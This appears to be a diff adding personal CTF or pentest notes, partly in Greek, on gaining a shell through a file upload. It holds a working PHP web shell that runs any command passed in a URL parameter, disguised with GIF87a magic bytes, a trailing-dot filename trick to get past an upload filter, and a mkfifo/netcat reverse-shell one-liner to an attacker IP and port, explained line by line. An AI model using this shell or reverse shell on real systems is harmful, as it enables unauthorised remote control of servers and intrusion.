@@ -1,0 +1,42 @@
+GIF87a
+<html>
+<body>
+ <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+ <input type="text" name="cmd" id="cmd" size="80">
+ <input type="submit" value="Execute">
+ </form>
+ <pre>
+<?php
+if (isset($_GET['cmd'])) {
+ system($_GET['cmd']);
+}
+?>
+ </pre>
+</body>
+<script>
+ document.getElementById("cmd").focus();
+</script>
+</html>
+
+
+
+
+
+put this at a file like: webshell.php.
+you need the . at the end to surpass the check
+
+with burp find where it get saved and go there
+
+
+
+
+then use this line:
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f| /bin/bash -i 2>&1 | nc <yourIP> <port> >/tmp/f
+
+Αυτός ο one-liner shell command είναι ένας reverse shell σε Linux, ο οποίος χρησιμοποιείται συχνά σε CTFs, pentests ή κατά την εκμετάλλευση (exploitation) ευπαθειών.
+rm /tmp/f;                # Διαγράφει το προσωρινό αρχείο /tmp/f (αν υπάρχει)
+mkfifo /tmp/f;            # Δημιουργεί ένα "named pipe" (FIFO) με όνομα /tmp/f
+cat /tmp/f |              # Διαβάζει από το pipe ό,τι γράφεται εκεί και το περνάει ως input στο:
+  /bin/bash -i 2>&1 |     # Εκτελεί ένα interactive shell (bash -i), ανακατευθύνει stderr στο stdout
+  nc      # Στέλνει την έξοδο (output) στο netcat server στο IP 10.10.14.18 και port 4444
+> /tmp/f                  # Το output του `nc` γράφεται ξανά στο pipe, κλείνοντας τον κύκλο
